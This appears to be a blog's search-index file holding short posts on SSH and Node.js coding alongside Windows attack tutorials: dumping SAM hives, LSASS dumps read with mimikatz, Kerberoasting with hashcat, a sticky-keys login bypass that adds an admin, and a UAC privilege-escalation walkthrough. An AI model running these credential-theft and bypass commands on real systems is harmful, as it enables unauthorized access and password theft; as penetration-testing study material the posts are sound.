hardening information can be found here: SSH Audit Linux Handbook - SSH Hardening CIS Benchmarks" }, { "title": "Configuring SSH Server", "url": "/posts/configuring-ssh-server/", "categories": "security, ssh", "tags": "security, ssh, cryptography", "date": "2021-05-24 22:41:09 +1000", "snippet": "Guide for learning how to setup and configure SSH server on Linux (debian). Getting Started Install SSH Server Server Config Connection Banner Login Welcome Message ...", "content": "Guide for learning how to setup and configure SSH server on Linux (debian). Getting Started Install SSH Server Server Config Connection Banner Login Welcome Message Passwordless SSH Authentication Enable Passwordless Authentication (Optional) Disable Password Authentication Creating SSH Key Pairs Authorized Keys SSH Private Keys Getting StartedInstall SSH Serversudo apt install openssh-serverServer ConfigLocated at /etc/ssh/sshd_config, this file contains configuration settings for your SSH server.If anything in here is changed, the SSH server daemon needs to be restarted:sudo systemctl restart sshConnection BannerThis is displayed when you attempt to SSH to a server. This is shown before you authenticate. Open /etc/ssh/sshd_config. Add Banner file location: ------#Banner noneBanner /etc/ssh/welcome_banner------- Restart SSH server daemon. sudo systemctl restart ssh Login Welcome MessageThis is the message that is shown after you successfully login. Edit the /etc/motd file to display your custom text.Passwordless SSH AuthenticationEnable Passwordless AuthenticationUpdate the following line in /etc/ssh/sshd_config:PubkeyAuthentication yesRestart SSH server daemon:sudo systemctl restart ssh(Optional) Disable Password AuthenticationUpdate the following line in /etc/ssh/sshd_config:PasswordAuthentication noCreating SSH Key PairsChoose one of the following methods:ssh-keygen -t rsa -b 4096ssh-keygen -t dsassh-keygen -t ecdsa -b 521ssh-keygen -t ed25519 dsa is supported, but not recommended.Authorized KeysThe /home/USER/.ssh/authorized_keys file on an SSH server contains a list of the public keys that can be used to log into the server. To login, the corresponding private must be used. This file can changed via the server config file if desired.SSH Private KeysPrivate keys are normally stored in the /home/USER/.ssh/ directory. These are used to connect to an SSH Server.Private keys must have the permission 600, otherwise the key may be rejected.Update permissions using the following command:chmod 600 PRIVATE_KEY_FILE" }, { "title": "Dump SAM, SYSTEM and SECURITY", "url": "/posts/dump-sam-system-and-security/", "categories": "security, windows", "tags": "security, windows, sam, system", "date": "2021-05-23 13:46:18 +1000", "snippet": "Demonstration of how dump SAM, SYSTEM and SECURITY registry files.PrerequisitesEnsure you have access to an Admin level command prompt.Dump Filesreg.exe save hklm\\sam sam.savreg.exe save hklm\\syste...", "content": "Demonstration of how dump SAM, SYSTEM and SECURITY registry files.PrerequisitesEnsure you have access to an Admin level command prompt.Dump Filesreg.exe save hklm\\sam sam.savreg.exe save hklm\\system system.savreg.exe save hklm\\security security.sav sam.sav, system.sav and security.sav are the names of the output files. The files will be saved in your current working directory if no path is given." }, { "title": "Windows UAC Privilege Escalation", "url": "/posts/windows-uac-privilege-escalation/", "categories": "security, windows", "tags": "security, windows, privesc, uac, cve", "date": "2021-05-20 22:02:58 +1000", "snippet": "Demonstration of how to perform Windows UAC Privilege Escalation (CVE-2019-1388). This vulnerability allows a user to escalate from a low privilege level (non-admin) to SYSTEM. Download EXE Walkt...", "content": "Demonstration of how to perform Windows UAC Privilege Escalation (CVE-2019-1388). This vulnerability allows a user to escalate from a low privilege level (non-admin) to SYSTEM. Download EXE Walkthrough Step 1 Step 2 Step 3 Step 4 Step 5 Download EXEWe’re going to use the exe that was used in the a PoC for this CVE. The exe can be downloaded here.WalkthroughStep 1Run the program as a Admin and we should see a prompt similar to this:Click Show details or Show more details, and click the link that says Show information about this publisher's certificateStep 2A new window will appear showing the certificate info.In the Issued By field, click the link: NOTE it will appear as if nothing happened. This is normal. A browser has actually been opened that we can’t see.Step 3Close the window showing the certificate info, and the UAC prompt.We can now see the browser that was opened: It doesn’t matter if the site doesn’t load. Internet is NOT required for this to work.Step 4Our goal now is to open a file browser/saver window. There is a few ways we can do this.One way is to click Page -&gt; Save As....Another way is to click Print -&gt; Find Printer.There’s other ways to do this, choose whatever works.Step 5Once we have this new window open, we need to type cmd in the location bar and click enter:A command prompt will now open that should be running as SYSTEM:" }, { "title": "Windows Custom Right Click Menu Option", "url": "/posts/custom-right-click-menu-option/", "categories": "programming", "tags": "windows, programming, command, scripting", "date": "2021-05-18 22:36:01 +1000", "snippet": "How to add a custom menu option to the right click menu in Windows 10 and have it execute a command/application.Steps Open regedit.msc. Navigate to HKEY_CLASSES_ROOT\\*\\shell. Right click on shel...", "content": "How to add a custom menu option to the right click menu in Windows 10 and have it execute a command/application.Steps Open regedit.msc. Navigate to HKEY_CLASSES_ROOT\\*\\shell. Right click on shell and select New -&gt; Key. Enter a name for your new menu option. On this new key (folder in the UI) right click and select New -&gt; Key. Call this new key command The default value should be the command you wish to execute when the menu option is clicked:ExampleThe following is how you would create a right click option run a file with NodeJS.First create a file with the following contents:node.exe %1pause %1 is how we pass in the target file (the file that was right clicked on) as a parameter to our program.Create the new right click menu (Run with NodeJS) in regedit and make it execute the above script:" }, { "title": "Using Wget", "url": "/posts/using-wget/", "categories": "security, web", "tags": "web, http, https, wget, curl, proxy", "date": "2021-05-18 21:48:55 +1000", "snippet": "How to perform requests using wget and setup a http proxy for wget.API Callwget https://testing.com/loginIgnore Cert Issues--no-check-certificateAdd Headers--header 'Authorization: Basic TOKEN_HERE...", "content": "How to perform requests using wget and setup a http proxy for wget.API Callwget https://testing.com/loginIgnore Cert Issues--no-check-certificateAdd Headers--header 'Authorization: Basic TOKEN_HERE'Add Body--post-data 'username=admin&amp;password=admin'All Togetherwget --no-check-certificate --header 'Authorization: Basic TOKEN_HERE' --post-data 'username=admin&amp;password=admin' https://testing.com/loginHTTP(S) ProxyOpen /etc/wgetrc as root:sudo nano /etc/wgetrcAdd/uncomment the following lines:https_proxy = http://127.0.0.1:8080/http_proxy = http://127.0.0.1:8080/" }, { "title": "User Dumping with MSOL", "url": "/posts/user-dumping-with-msol/", "categories": "security, windows", "tags": "security, windows, users, ad, powershell", "date": "2021-05-16 16:19:39 +1000", "snippet": "With MSOnline you can extract &amp; search for users in a domain after obtaining a domain account. Install MSOnline Connect Search &amp; Dump Commands Dump all Users Dump first 100...", "content": "With MSOnline you can extract &amp; search for users in a domain after obtaining a domain account. Install MSOnline Connect Search &amp; Dump Commands Dump all Users Dump first 1000 Users Search Users by Name Search Users by Email Help Install MSOnlineInstall-Module MSOnlineConnectConnect-MsolService A window should appear where you will have to login to microsoft using your domain credentials.Search &amp; Dump CommandsThe following commands can be run without exporting to a file FYI.Dump all UsersGet-MsolUser | Export-CSV users.csvDump first 1000 UsersGet-MsolUser -MaxResult 1000 | Export-CSV users.csvSearch Users by NameGet-MsolUser -SearchString \"Alex\" | Export-CSV users.csvSearch Users by EmailGet-MsolUser -UserPrincipalName \"alex@email.com\" | Export-CSV users.csvHelpGet-Help Get-MsolUser" }, { "title": "When are OPTIONS Requests Sent?", "url": "/posts/when-do-options-requests-get-sent/", "categories": "security, web", "tags": "web, http, security, csrf, cors", "date": "2021-05-15 10:41:50 +1000", "snippet": "In this post we’ll look at OPTIONS requests, when they get sent, and their security implications.A basic understanding of CORS and CSRF attacks would be beneficial before reading this post. Same O...", "content": "In this post we’ll look at OPTIONS requests, when they get sent, and their security implications.A basic understanding of CORS and CSRF attacks would be beneficial before reading this post. Same Origin Requests Cross Origin Requests HTML Form Submission Additional Headers Security ImplicationsSame Origin RequestsWe’ll start off by looking at requests from the same origin.Below we have loaded our testing website my-testing.com, which is a local web server I’m hosting.If we call one of the server APIs, we will have no issues as the request is not cross-origin. The response body {result: true} is also visible in the browser:The result is the same if add additional headers and a body to the request:Cross Origin RequestsLet’s see the difference when we start performing requests to my-testing.com from another origin.HTML Form SubmissionOn a different site we’ll create and submit a HTML form using JavaScript:Using an interception proxy (i.e. burp), we can see the request details: Notice the Origin header indicating where the request came from. Also notice the session token (cookie) was included.From the response we can see that the request was successful: If this was a state changing request like create-user, update-details, etc, then congrats because we just performed a CSRF (cross-site request forgery) attack.However, no OPTIONS requests have been sent so far, so why not?Additional HeadersLet’s now assume that the /endpoint API on my-testing.com accepts a JSON body instead of a HTML form. We can use the fetch command in JavaScript to update the content-type header, add a JSON body, and perform the request: We’re unable to see the response in the browser due to missing CORS headers, but this might not matter if it’s a state changing request, as the action may have still been performed by the server.Let’s see what request(s) were sent using our proxy:Now an OPTIONS request was sent, but no POST request.Because we added extra headers, the browser sends a preflight request (OPTIONS) to ensure this origin (node-security.com) has permission to send requests to the target origin (my-testing.com).If we want the OPTIONS request to succeed, then we need to add the following CORS headers: Access-Control-Allow-Origin Access-Control-Allow-Headers Access-Control-Allow-Methods Access-Control-Allow-CredentialsLet’s call the API again now with the correct headers added to the OPTIONS response:The request still “failed” because of CORS issues, but again, this may not matter if the POST request was sent.Looking at our proxy history we see the following:We can see that the correct headers were added to the OPTIONS response which means the browser will perform the POST request. The POST request still “failed” because there are still missing CORS headers on the response.If we wanted no errors, the following response headers need to be added: Access-Control-Allow-Origin: https://node-security.com Access-Control-Allow-Credentials: trueSummaryOPTIONS requests are sent when additional headers have been added to cross-origin requests. The request is a preflight check to see if the origin is allowed to perform the request.Security ImplicationsThe question we want to ask is do OPTIONS requests provide protection against CSRF attacks? This is similar to asking if CORS provides protection against CSRF attacks?The answer to both of these, annoyingly, is yes and no. There are situations when it does, but also situations when it doesn’t.A better answer is that it’s not a reliable protection mechanism against CSRF. Better mechanisms include Anti-CSRF tokens (sometimes), utilizing the SameSite flag on cookies, and checking the Origin header server-side." }, { "title": "Admin to SYSTEM with PsExec", "url": "/posts/admin-to-system-with-psexec/", "categories": "security, windows", "tags": "security, windows, privesc", "date": "2021-05-14 19:01:12 +1000", "snippet": "Escalate from admin to SYSTEM on a windows machine by doing the following.Download ToolsDownload Sysinternals Suite from Microsoft here.From Admin to SYSTEMRun the following command in an Admin com...", "content": "Escalate from admin to SYSTEM on a windows machine by doing the following.Download ToolsDownload Sysinternals Suite from Microsoft here.From Admin to SYSTEMRun the following command in an Admin command prompt:PsExec64.exe -i -s -d -accepteula cmd Additional info here." }, { "title": "Extract NTLM Hashes via Linux Live Boot", "url": "/posts/extract-ntlm-hashes-via-linux-live-boot/", "categories": "security, windows", "tags": "security, windows, sam, system, kali, samdump2, passwords, hashes, ntlm", "date": "2021-05-13 20:43:05 +1000", "snippet": "Using a live boot of Linux, we can extract the NTLM hashes of the windows accounts on a computer and attempt to crack to find out the passwords. Prerequisites Mount Drive Dump HashesPrerequisite...", "content": "Using a live boot of Linux, we can extract the NTLM hashes of the windows accounts on a computer and attempt to crack to find out the passwords. Prerequisites Mount Drive Dump HashesPrerequisites Physical access to a Windows Machine without BitLocker Bootable Linux USB (ideally Kali)Mount DriveCreate a new directory where the drive will be mounted:mkdir FOLDER_NAMEList Block Devices:lsblkMount the primary windows partition (it should be the largest one there):mount /dev/PARTITION_NAME FOLDER_NAME FOLDER_NAME is the folder created aboveDump HashesNavigate to Windows/System32/config in the mounted drive and run:samdump2 SYSTEM SAM Hashes will be in PWDump format &lt;username&gt;:&lt;uid&gt;:&lt;LM-hash&gt;:&lt;NTLM-hash&gt;:&lt;comment&gt;:&lt;homedir&gt;:" }, { "title": "Sticky Keys Windows Login Bypass", "url": "/posts/sticky-keys-windows-login-bypass/", "categories": "security, windows", "tags": "security, windows, kali, passwords, privesc", "date": "2021-05-12 19:02:54 +1000", "snippet": "Using a live boot of Linux, we can bypass windows login by changing the sticky keys executable to command prompt. When at the windows login screen, stick keys can be activated to spawn a shell runn...", "content": "Using a live boot of Linux, we can bypass windows login by changing the sticky keys executable to command prompt. When at the windows login screen, stick keys can be activated to spawn a shell running as SYSTEM. A new user can be created, or the password can be changed for an existing account. Prerequisites Mount Drive Update EXE Names Bypass Login Change a Password Create new Admin Delete User Prerequisites Physical access to a Windows Machine without BitLocker Bootable Linux USB (ideally Kali)Mount DriveCreate a new directory where the drive will be mounted:mkdir FOLDER_NAMEList Block Devices:lsblkMount the primary windows partition (it should be the largest one there):mount /dev/PARTITION_NAME FOLDER_NAME FOLDER_NAME is the folder created aboveUpdate EXE NamesNavigate to Windows/System32/config in the mounted driveRename the sethc.exe file (this is sticky keys):mv sethc.exe sethcBackup.exeMake a copy of cmd.exe and rename it to sethc.exe:cp cmd.exe sethc.exeBypass LoginWhen at the login screen, pressing shift 5 times should now spawn a shell running as SYSTEM.Change a Passwordnet user USERNAME NEW_PASSWORDCreate new Adminnet user /add USERNAME PASSWORDnet localgroup administrators USERNAME /addDelete Usernet user /delete USERNAME" }, { "title": "How to Kerberoast", "url": "/posts/how-to-kerberoast/", "categories": "security, windows", "tags": "security, windows, kerberos, ad, powershell, passwords, hashes", "date": "2021-05-11 18:32:02 +1000", "snippet": " Prerequisites PowerShell Import &amp; Run Crack TokensPrerequisitesMake sure you’re on a domain joined computer, or are running PowerShell in the context of a domain user.Download the required...", "content": " Prerequisites PowerShell Import &amp; Run Crack TokensPrerequisitesMake sure you’re on a domain joined computer, or are running PowerShell in the context of a domain user.Download the required script from Github here, or a local copy can be found here.PowerShellEnable script execution:powershell –ExecutionPolicy BypassImport &amp; RunImport the Kerberoast module:Import-Module .\\Invoke-Kerberoast.ps1Run Invoke-Kerberoast:Invoke-Kerberoast -OutputFormat Hashcat | Export-Csv -Path kerb.csvCrack TokensFrom the output CSV file, copy the tickets from the Hash column.Paste these tickets into a text file tickets.txt.You can use the following command in PowerShell to attempt to crack the tickets with Hashcat:.\\hashcat64.exe -m 13100 -a 0 .\\tickets.txt .\\rockyou.txt" }, { "title": "LSASS Dumping", "url": "/posts/lsass-dumping/", "categories": "security, windows", "tags": "security, windows, lsass, passwords, hashes, ntlm, mimikatz", "date": "2021-05-10 21:03:25 +1000", "snippet": "Create a dump file of lsass process using multiple different techniques. Task Manager Create Dump File Procdump Download Tools Dump LSASS Minidump Dow...", "content": "Create a dump file of lsass process using multiple different techniques. Task Manager Create Dump File Procdump Download Tools Dump LSASS Minidump Download Minidump Import &amp; Run Minidump Extract Passwords/Hashes from Dump File with MimikatzTask ManagerCreate Dump File Open Task Manger and locate the LSASS process. It will be called lsass.exe or Local Security Authority Process. Right click on the process and select Create dump file.ProcdumpDownload ToolsDownload Sysinternals Suite from Microsoft here.Dump LSASSRun the following command in an Admin command prompt:procdump64.exe -ma lsass.exe lsass.dmpMinidumpDownload MinidumpDownload the required script from Github here, or a local copy can be found here.Import &amp; Run MinidumpImport Minidump module:Import-module .\\Out-Minidump.ps1Run the module and dump the process:Get-Process lsass | Out-MinidumpExtract Passwords/Hashes from Dump File with MimikatzDownload Mimikatz from GitHub here.Open mimikatz.exe and run:sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords" }, { "title": "NodeJS Express SNI", "url": "/posts/express-sni/", "categories": "javascript, nodejs", "tags": "javascript, express, sni, web, https, http, nodejs, server", "date": "2021-05-01 18:50:58 +1000", "snippet": "In this post we’ll look at how to add SNI (Server Name Indication) to an express HTTPS server. This will allow us to return different certificates based on the domain (server name).This post will a...", "content": "In this post we’ll look at how to add SNI (Server Name Indication) to an express HTTPS server. This will allow us to return different certificates based on the domain (server name).This post will assume that you already know how to setup a HTTPS server using express. If you don’t know how to, you can learn here. SNI Callback Function Server Options Full CodeSNI Callback FunctionThe first step will be to create a function that will be called when a new TLS connection is received. This function decides which certificate and private key to use based on the server name.const sniDefaultCert = fs.readFileSync(path.join(__dirname, 'certs/normal.crt'));const sniDefaultKey = fs.readFileSync(path.join(__dirname, 'certs/normal.key'));const sniCallback = (serverName, callback) =&gt; {\tlet cert = null;\tlet key = null;\tif (serverName === 'testing.com') {\t\tcert = fs.readFileSync(path.join(__dirname, 'certs/testing.crt'));\t\tkey = fs.readFileSync(path.join(__dirname, 'certs/testing.key'));\t} else {\t\tcert = sniDefaultCert;\t\tkey = sniDefaultKey;\t}\tcallback(null, new tls.createSecureContext({\t\tcert,\t\tkey,\t}));} When a connection is received for testing.com, the testing.crt cert will be used. The normal.crt cert will be used for all other domains.Server OptionsTo enable SNI, we need to add the key SNICallback to the server options Object. The value will be a callback that will be invoked when a new TLS connection is received.const serverOptions = {\tSNICallback: sniCallback,\t// Optional: TLS Versions\tmaxVersion: 'TLSv1.3',\tminVersion: 'TLSv1.2'}Full Codenpm i expressconst express = require('express');const path = require('path');const fs = require('fs');const tls = require('tls');const app = express();const PORT = 8443;const sniDefaultCert = fs.readFileSync(path.join(__dirname, 'certs/normal.crt'));const sniDefaultKey = fs.readFileSync(path.join(__dirname, 'certs/normal.key'));const sniCallback = (serverName, callback) =&gt; {\tconsole.log(serverName);\tlet cert = null;\tlet key = null;\tif (serverName === 'testing.com') {\t\tcert = fs.readFileSync(path.join(__dirname, 'certs/testing.crt'));\t\tkey = fs.readFileSync(path.join(__dirname, 'certs/testing.key'));\t} else {\t\tcert = sniDefaultCert;\t\tkey = sniDefaultKey;\t}\tcallback(null, new tls.createSecureContext({\t\tcert,\t\tkey,\t}));}const serverOptions = {\tSNICallback: sniCallback,\t// Optional: TLS Versions\tmaxVersion: 'TLSv1.3',\tminVersion: 'TLSv1.2'}const server = require('https').Server(serverOptions, app);app.get('/', (req, res) =&gt; {\tconsole.log(req.socket.servername);\tres.send(`&lt;h1&gt;Welcome&lt;/h1&gt;`);});// Start the Serverserver.listen(PORT, () =&gt; {\tconsole.log(`[-] Server Listening on Port ${PORT}`);});" }, { "title": "Docx Templating in JavaScript", "url": "/posts/docx-templating-in-javascript/", "categories": "javascript, programming", "tags": "javascript, programming, docx, nodejs, react", "date": "2021-04-30 14:10:46 +1000", "snippet": "In this guide we’ll look at how to create a docx template and fill out that document using JavaScript. We’ll do this by using the docxtemplater package. This works in both NodeJS and React. Instal...", "content": "In this guide we’ll look at how to create a docx template and fill out that document using JavaScript. We’ll do this by using the docxtemplater package. This works in both NodeJS and React. Installing Requirements The Code Filling out the Template with JavaScript Direct Values Styling Lists Table Rows Conditional Rendering Helpful Tips Too Much Spacing Error Finding 1 Error Finding 2 Tag Names Installing RequirementsInstall the docxtemplater &amp; pizzip packages using the following command:npm i docxtemplater pizzipThe CodeThe main code for all the below examples will stay the same. The only thing that will be changing is the dataToAdd Object (line 14). All other lines will stay the same.const fs = require('fs');const path = require('path');const PizZip = require('pizzip');const Docxtemplater = require('docxtemplater');// Load the templated docx fileconst templateFile = fs.readFileSync(path.resolve(__dirname, 'template.docx'), 'binary');const zip = new PizZip(templateFile);try {\t// Attempt to read all the templated tags\tlet outputDocument = new Docxtemplater(zip);\tconst dataToAdd = {};\t// Set the data we wish to add to the document\toutputDocument.setData(dataToAdd);\ttry {\t\t// Attempt to render the document (Add data to the template)\t\toutputDocument.render()\t\t// Create a buffer to store the output data\t\tlet outputDocumentBuffer = outputDocument.getZip().generate({ type: 'nodebuffer' });\t\t// Save the buffer to a file\t\tfs.writeFileSync(path.resolve(__dirname, 'OUTPUT.docx'), outputDocumentBuffer);\t}\tcatch (error) {\t\tconsole.error(`ERROR Filling out Template:`);\t\tconsole.error(error)\t}} catch(error) {\tconsole.error(`ERROR Loading Template:`);\tconsole.error(error);}Filling out the Template with JavaScriptAll of the data that will be added to the template will be contained within a single Object called dataToAdd.Each key in the dataToAdd Object refers to a tag that was placed in the docx file. Let’s see how to do this:Direct ValuesDirect values simply mean static values that we wish to insert into the document. Some examples would be the date, author, title. Simple text values you wish to add that may change with each document.Docx FileThe Codeconst dataToAdd = { document_creation_date: (new Date()).toLocaleDateString()};ResultsStylingThe style that is applied to the tag in the document will be inherited by the value that is inserted:Docx FileThe Codeconst dataToAdd = { document_creation_date: (new Date()).toLocaleDateString(), document_author: 'Alexander Wells',};ResultsListsA very useful feature is to be able to template repetitive sections. Perhaps the document is suppose to contain the profiles of some employees. Let’s see how we can use lists to do this:Docx File Lists are prefixed with the # character to start the list scope, and the / character to end the list scope.The Codeconst dataToAdd = { employeeList: [ { id: 28521, name: 'Frank', age: 34, city: 'Melbourne' }, { id: 84973, name: 'Chloe', age: 28, city: 'Perth' }, ]}; When using lists, the value should be a list of Objects. The keys of each Object will refer to the tags used inside the List in the docx file (id, name, age, city).ResultsTable RowsWe can also use lists to create additional rows of a table. Let’s use the employee example again, but this time let’s use a table to represent the data:Docx FileThe Codeconst dataToAdd = { employeeList: [ { id: 28521, name: 'Frank', age: 34, city: 'Melbourne' }, { id: 84973, name: 'Chloe', age: 28, city: 'Perth' }, { id: 10349, name: 'Hank', age: 68, city: 'Hobart' }, { id: 44586, name: 'Gordon', age: 47, city: 'Melbourne' }, ]};ResultsConditional RenderingDocx FileAnother useful feature would be if we could only render certain things if a condition is met. Let’s see how we can do that:The Codeconst dataToAdd = { showDocumentAuthor: true, document_author: 'Alexander Wells',};ResultsChanging showDocumentAuthor to false means the data inside the conditional statement won’t be rendered.Helpful TipsToo Much SpacingYou may notice if you use loops that extra spacing gets added where you don’t want. Let’s look at an example where this is very clear:const dataToAdd = { groceryList: [ { item: 'Eggs' }, { item: 'Steak' }, { item: 'Apples' } ],}; With visible formatting enabled we can see the issue. An extra line has been inserted between each list element.We can fix this by enabling by enabling paragraphLoop option when creating our output document:let outputDocument = new Docxtemplater(zip, { paragraphLoop: true });Error Finding 1 One downside of this library is that error locations is actually a paid feature (yes I’m serious), look here. This is an inconvenience and nothing more. I STRONGLY suggest that you do templating in small batches. Add a few tags, test, add a few more, then test again. Please do not spend hours (or even an hour) templating before testing. It will save you a massive headache when the program just says error, and you have to hunt through your document to find the issue.Error Finding 2 Ensure that your tags in the docx file do not contain spaces at the start or end. If you have a list tag called {#employeeList}, ensure there is no whitespace like this {#employeeList }, as this can cause the program to fail. Microsoft Word can automatically add spaces so be aware of that.Tag Names USE GOOD TAG NAMES! Just like when programming you try and use good variable names, same goes here. A large document may have dozens or hundreds of tags. Using date for a tag name is BAD! Using document_creation_date is much better as it’s clear exactly what date it’s referring to." }, { "title": "Web Workers", "url": "/posts/web-workers/", "categories": "javascript, programming", "tags": "javascript, web-workers, programming, web, algorithm", "date": "2021-04-29 17:40:58 +1000", "snippet": "This page will demonstrate how to setup Web Workers, dispatch tasks to workers, and send messages/results from workers to the main thread. HTML Page Worker Code Example OutputHTML Page&lt;!DOCTY...", "content": "This page will demonstrate how to setup Web Workers, dispatch tasks to workers, and send messages/results from workers to the main thread. HTML Page Worker Code Example OutputHTML Page&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;\t&lt;title&gt;Web Workers&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\t&lt;script type=\"text/javascript\"&gt;\t\tconsole.log('Creating Web Worker(s)...');\t\t// Handler function for when a Worker sends a message\t\tconst workerOnMessageHandler = ({ data }) =&gt; {\t\t\tlet { workerId, action, outputData} = data;\t\t\tif (action === 'print-data') {\t\t\t\tconsole.log(...outputData);\t\t\t} else if (action === 'randomNumber') {\t\t\t\tconsole.log(`Random Number Results from Worker ${workerId}:`, outputData);\t\t\t}\t\t}\t\t// How many Workers we want to create\t\tconst totalWorkers = 4;\t\tconst randomNumberRange = 1000;\t\t// List to store our Workers\t\tlet workerList = [];\t\t// Create Workers\t\tfor (let i = 0; i &lt; totalWorkers; ++i) {\t\t\t// Create a new random number Worker\t\t\tlet workerObj = new Worker('worker-randomNumber.js');\t\t\t// Set the callback for when the Worker posts a message\t\t\tworkerObj.onmessage = workerOnMessageHandler;\t\t\t// Add the Worker to the Worker list\t\t\tworkerList.push({ workerId: i, action: 'randomNumber', workerObj })\t\t}\t\t// Send a task to each Worker\t\tfor (let i = 0; i &lt; workerList.length; ++i) {\t\t\tworkerList[i].workerObj.postMessage({\t\t\t\tworkerId: workerList[i].workerId,\t\t\t\taction: 'randomNumber',\t\t\t\tinputData: randomNumberRange\t\t\t});\t\t}\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; The postMessage function calls the function stored in self.onmessage inside the Web Worker (see below).Worker Codeconst printMessage = (workerId, ...msg) =&gt; {\tself.postMessage({\t\tworkerId,\t\taction: 'print-data',\t\toutputData: msg\t});}const calculations = (inputData) =&gt; {\treturn Math.round(Math.random()*inputData);}self.onmessage = ({ data }) =&gt; {\tlet { workerId, action, inputData } = data;\t// Print the string to the screen\tprintMessage(workerId, `Worker (${workerId}) Received Data:`, inputData);\t// Calculate results\tlet result = calculations(inputData);\t// Return results\tself.postMessage({ workerId, action, outputData: result });} The postMessage function here calls the function stored in workerObj.onmessage that was set for this Worker in the main thread.Example Output NOTE there is no guarantee that the tasks will finish in any sort of order. The order will very likely change every time the program is run." }, { "title": "Web-Sockets - Socket.IO", "url": "/posts/websockets-socketio/", "categories": "javascript, nodejs", "tags": "javascript, web-sockets, socketio, http, https, nodejs, express, react", "date": "2021-04-29 16:33:02 +1000", "snippet": "This guide will demonstrate how to setup an express webserver that uses Socket.IO for communication. Installing Requirements Backend Code Frontend Code Standard HTML Page React ...", "content": "This guide will demonstrate how to setup an express webserver that uses Socket.IO for communication. Installing Requirements Backend Code Frontend Code Standard HTML Page React Installing RequirementsInstall the express and socket.io packages using the following command:npm i express socket.ioBackend Codeconst express = require('express');const path = require('path');const fs = require('fs');const ws = require('ws');const app = express();const HOSTNAME = 'testing.com';const PORT = 8443;// TLS Optionsconst serverOptions = {\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key'))}const httpServer = require('https').Server(serverOptions, app);const io = require('socket.io')(httpServer);// New WebSocket Connectionio.on('connection', (socket) =&gt; {\t// Verify cookie is valid here\tlet cookie = socket.handshake?.headers?.cookie || 'N/A';\tsocket.on('/endpoint/1', (msg) =&gt; {\t\tconsole.log('/endpoint/1', msg);\t});\tsocket.on('/endpoint/2', (msg) =&gt; {\t\tconsole.log('/endpoint/2', msg);\t\tsocket.emit('/api/connected', 'Connection Success');\t});\tsocket.on('/close-socket', () =&gt; {\t\tsocket.disconnect();\t});\tsocket.on('disconnect', () =&gt; {\t\tconsole.log('Socket Closed:', socket.id);\t});});// Don't allow standard WebSocket Connections httpServer.on('upgrade', (request, socket) =&gt; {\tconsole.log('here');\tsocket.destroy();});app.get('/', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'index.html'));});// Start the ServerhttpServer.listen(PORT, () =&gt; {\tconsole.log(`[-] Server Listening on Port ${PORT}`);});Frontend CodeStandard HTML Page&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;\t&lt;title&gt;WebSocket - Socket IO&lt;/title&gt;&lt;/head&gt;&lt;body&gt;\t&lt;h4&gt;WebSocket - Socket IO&lt;/h4&gt;\t&lt;script src=\"/socket.io/socket.io.js\"&gt;&lt;/script&gt;\t&lt;script&gt;\t\tconst socket = io('https://testing.com:8443');\t\tsocket.on('connect', () =&gt; {\t\t\tconsole.log('CONNECTED');\t\t\tsocket.emit('/endpoint/2', 'Test Message');\t\t});\t\tsocket.on('disconnect', () =&gt; {\t\t\tconsole.log('DISCONNECTED');\t\t});\t\tsocket.on('/api/connected', (msg) =&gt; {\t\t\tconsole.log(`MSG:`, msg);\t\t});\t\tsetTimeout(() =&gt; {\t\t\tsocket.emit('/endpoint/2', 'Test Message');\t\t}, 1000)\t&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;ReactTo use Socket.IO with React we need to do the following:npm i socket.io-clientimport openSocket from 'socket.io-client';let socket = openSocket('https://testing.com:8443'); You can then use the library as normal." }, { "title": "Web-Sockets - Native", "url": "/posts/websockets-native/", "categories": "javascript, nodejs", "tags": "javascript, web-sockets, http, https, nodejs, express", "date": "2021-04-29 11:28:07 +1000", "snippet": "This guide will demonstrate how to setup an express webserver that uses built-in browser WebSockets for communication. Installing Requirements Backend Code Frontend CodeInstalling RequirementsIn...", "content": "This guide will demonstrate how to setup an express webserver that uses built-in browser WebSockets for communication. Installing Requirements Backend Code Frontend CodeInstalling RequirementsInstall the express &amp; ws packages using the following command:npm i express wsBackend Codeconst express = require('express');const path = require('path');const fs = require('fs');const ws = require('ws');const app = express();const HOSTNAME = 'testing.com';const PORT = 8443;// TLS Optionsconst serverOptions = {\tcert: fs.readFileSync(path.join(__dirname, 'certs/host.crt')),\tkey: fs.readFileSync(path.join(__dirname, 'certs/host.key'))}const httpServer = require('https').Server(serverOptions, app);const webSocketServer = new ws.Server({ noServer: true });// Handle WebSocket Connections (After Upgrade)webSocketServer.on('connection', (socket, req) =&gt; {\tconsole.log('New WebSocket connection', req.socket.remoteAddress);\tsocket.on('message', (msg) =&gt; {\t\tconsole.log('New MSG:', msg);\t\tsocket.send('Received');\t});\tsocket.on('error', (err) =&gt; {\t\tconsole.log('ERROR:', err);\t\tsocket.terminate();\t});});// Handle WebSocket UpgradehttpServer.on('upgrade', (request, socket, head) =&gt; {\t// Connection IP\tconsole.log(`Remote Address: ${socket.remoteAddress}`);\t// Check the Origin is correct, prevent CSWSH (Cross-Site Web-Socket Hijacking)\tif (request.headers.origin === `https://${HOSTNAME}:${PORT}`) {\t\t// Check Cookie is valid here\t\tconsole.log(request.headers.cookie);\t\t// Upgrade the connection to a WebSocket\t\twebSocketServer.handleUpgrade(request, socket, head, (newSocket) =&gt; {\t\t\twebSocketServer.emit('connection', newSocket, request)\t\t});\t} else {\t\t// Origin was incorrect, reject connection\t\tsocket.write('HTTP/1.1 401 Unauthorized\\r\\nConnection: close\\r\\n\\r\\n');\t\tsocket.destroy();\t}})app.get('/', (req, res) =&gt; {\tres.sendFile(path.join(__dirname, 'index.html'));});// Start the ServerhttpServer.listen(PORT, () =&gt; {\tconsole.log(`[-] Server Listening on Port ${PORT}`);});Frontend Code&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;WebSockets - Native&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h4&gt;WebSockets - Native&lt;/h4&gt; &lt;script&gt; connectSocket = (url, params) =&gt; { let socket = new WebSocket(url, params); socket.onopen = () =&gt; { console.log(\"OPENED\"); socket.send('Test Message'); } socket.onmessage = (msg) =&gt; { console.log(`MSG: 